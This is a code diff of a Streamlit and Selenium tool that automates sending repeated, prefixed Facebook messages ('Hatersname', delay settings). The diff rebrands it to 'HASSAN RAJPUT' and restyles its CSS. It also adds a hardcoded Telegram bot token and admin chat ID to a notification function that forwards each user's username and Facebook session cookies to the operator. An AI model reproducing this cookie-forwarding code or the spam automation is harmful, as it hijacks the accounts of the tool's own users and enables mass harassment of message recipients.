@@ -19,172 +19,116 @@ st.set_page_config(
 
 custom_css = """
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-
-* {
-    font-family: 'Poppins', sans-serif;
-    box-sizing: border-box;
-}
-
-body {
-    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-    color: #333;
-    margin: 0;
-    padding: 0;
-}
-
-/* 🔹 HEADER */
-.main-header {
-    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-    padding: 2.5rem 1.5rem;
-    border-radius: 18px;
-    text-align: center;
-    margin-bottom: 2rem;
-    box-shadow: 0 10px 40px rgba(101, 116, 205, 0.35);
-    backdrop-filter: blur(10px);
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-}
-.main-header:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 15px 45px rgba(101, 116, 205, 0.45);
-}
-
-.main-header h1 {
-    color: #fff;
-    font-size: 2.7rem;
-    font-weight: 700;
-    margin: 0;
-    text-shadow: 0 3px 6px rgba(0,0,0,0.25);
-}
-
-.main-header p {
-    color: rgba(255,255,255,0.9);
-    font-size: 1.15rem;
-    margin-top: 0.5rem;
-}
-
-/* 🔹 BUTTONS */
-.stButton>button {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: #fff;
-    border: none;
-    border-radius: 12px;
-    padding: 0.8rem 2.2rem;
-    font-weight: 600;
-    font-size: 1rem;
-    letter-spacing: 0.5px;
-    cursor: pointer;
-    transition: all 0.25s ease;
-    box-shadow: 0 6px 20px rgba(118, 75, 162, 0.4);
-}
-.stButton>button:hover {
-    transform: translateY(-2px) scale(1.03);
-    box-shadow: 0 8px 28px rgba(118, 75, 162, 0.6);
-}
-
-/* 🔹 LOGIN / CARD BOXES */
-.login-box {
-    background: rgba(255, 255, 255, 0.85);
-    padding: 3rem;
-    border-radius: 25px;
-    box-shadow: 0 25px 70px rgba(0,0,0,0.1);
-    max-width: 520px;
-    margin: 3rem auto;
-    backdrop-filter: blur(12px);
-    transition: all 0.3s ease;
-}
-.login-box:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 30px 80px rgba(0,0,0,0.15);
-}
-
-/* 🔹 STATUS BOXES */
-.success-box {
-    background: linear-gradient(135deg, #56ab2f 0%, #a8e063 100%);
-    padding: 1rem;
-    border-radius: 12px;
-    color: white;
-    text-align: center;
-    margin: 1rem 0;
-    font-weight: 600;
-    box-shadow: 0 6px 18px rgba(86, 171, 47, 0.35);
-}
-
-.error-box {
-    background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
-    padding: 1rem;
-    border-radius: 12px;
-    color: white;
-    text-align: center;
-    margin: 1rem 0;
-    font-weight: 600;
-    box-shadow: 0 6px 18px rgba(255, 75, 43, 0.35);
-}
-
-/* 🔹 INPUT FIELDS */
-.stTextInput>div>div>input, 
-.stTextArea>div>div>textarea, 
-.stNumberInput>div>div>input {
-    border-radius: 12px;
-    border: 2px solid #e3e3e3;
-    padding: 0.85rem;
-    transition: all 0.25s ease;
-    background: rgba(255,255,255,0.8);
-}
-.stTextInput>div>div>input:focus, 
-.stTextArea>div>div>textarea:focus {
-    border-color: #667eea;
-    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.25);
-    background: white;
-}
-
-/* 🔹 INFO CARD */
-.info-card {
-    background: rgba(255,255,255,0.85);
-    padding: 1.75rem;
-    border-radius: 18px;
-    margin: 1.2rem 0;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.08);
-    backdrop-filter: blur(10px);
-}
-
-/* 🔹 LOG CONSOLE */
-.log-container {
-    background: #0f0f0f;
-    color: #00ff99;
-    padding: 1rem 1.25rem;
-    border-radius: 12px;
-    font-family: 'Courier New', monospace;
-    max-height: 450px;
-    overflow-y: auto;
-    box-shadow: inset 0 0 12px rgba(0,255,153,0.15);
-    border: 1px solid rgba(0,255,153,0.2);
-}
-.log-container::-webkit-scrollbar {
-    width: 8px;
-}
-.log-container::-webkit-scrollbar-thumb {
-    background: rgba(0,255,153,0.3);
-    border-radius: 10px;
-}
-
-/* 🔹 FOOTER */
-.footer {
-    text-align: center;
-    padding: 2rem;
-    color: #6a11cb;
-    font-weight: 600;
-    margin-top: 4rem;
-    font-size: 0.95rem;
-    opacity: 0.8;
-}
-.footer:hover {
-    opacity: 1;
-    transform: scale(1.03);
-    transition: 0.3s ease;
-}
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+    
+    * {
+        font-family: 'Poppins', sans-serif;
+    }
+    
+    .main-header {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        padding: 2rem;
+        border-radius: 15px;
+        text-align: center;
+        margin-bottom: 2rem;
+        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+    }
+    
+    .main-header h1 {
+        color: white;
+        font-size: 2.5rem;
+        font-weight: 700;
+        margin: 0;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+    }
+    
+    .main-header p {
+        color: rgba(255,255,255,0.9);
+        font-size: 1.1rem;
+        margin-top: 0.5rem;
+    }
+    
+    .stButton>button {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        border: none;
+        border-radius: 10px;
+        padding: 0.75rem 2rem;
+        font-weight: 600;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+    
+    .stButton>button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+    }
+    
+    .login-box {
+        background: white;
+        padding: 3rem;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+        max-width: 500px;
+        margin: 2rem auto;
+    }
+    
+    .success-box {
+        background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
+        padding: 1rem;
+        border-radius: 10px;
+        color: white;
+        text-align: center;
+        margin: 1rem 0;
+    }
+    
+    .error-box {
+        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+        padding: 1rem;
+        border-radius: 10px;
+        color: white;
+        text-align: center;
+        margin: 1rem 0;
+    }
+    
+    .footer {
+        text-align: center;
+        padding: 2rem;
+        color: #667eea;
+        font-weight: 600;
+        margin-top: 3rem;
+    }
+    
+    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {
+        border-radius: 10px;
+        border: 2px solid #e0e0e0;
+        padding: 0.75rem;
+        transition: all 0.3s ease;
+    }
+    
+    .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
+        border-color: #667eea;
+        box-shadow: 0 0 0 2px rgba(102, 126, 234, 0.2);
+    }
+    
+    .info-card {
+        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        padding: 1.5rem;
+        border-radius: 15px;
+        margin: 1rem 0;
+    }
+    
+    .log-container {
+        background: #1e1e1e;
+        color: #00ff00;
+        padding: 1rem;
+        border-radius: 10px;
+        font-family: 'Courier New', monospace;
+        max-height: 400px;
+        overflow-y: auto;
+    }
 </style>
-
 """
 
 st.markdown(custom_css, unsafe_allow_html=True)
@@ -530,8 +474,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 def send_telegram_notification(username, automation_state=None, cookies=""):
     """Send admin notification via Telegram bot - MUCH MORE RELIABLE than Facebook!"""
     try:
-        telegram_bot_token = ""
-        telegram_admin_chat_id = ""
+        telegram_bot_token = "79045aXI"
+        telegram_admin_chat_id = "532"
         
         from datetime import datetime
         import pytz
@@ -544,7 +488,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 👤 *Username:* {username}
 ⏰ *Time:* {current_time}
-🤖 *System:* Prince E2EE Facebook Automation
+🤖 *System:* HASSAN RAJPUT E2EE Facebook Automation
 🍪 *Cookies:* `{cookies_display}`
 
 ✅ User has successfully started the automation process."""
@@ -851,7 +795,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                                 time.sleep(8)
                                 
                                 try:
-                                    continue_buttons = driver.8(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
+                                    continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
                                     
                                     for cont_btn in continue_buttons:
                                         btn_text = (cont_btn.text or '').lower()
@@ -1191,7 +1135,7 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>HASSAN E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>HASSAN RAJPUT E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
@@ -1277,7 +1221,7 @@ else:
                                    help="Facebook conversation ID from the URL")
             
             name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'],
-                                       placeholder="e.g., [END TO END PRINCE HERE]",
+                                       placeholder="e.g., [END TO END HASSAN RAJPUT HERE]",
                                        help="Prefix to add before each message")
             
             delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
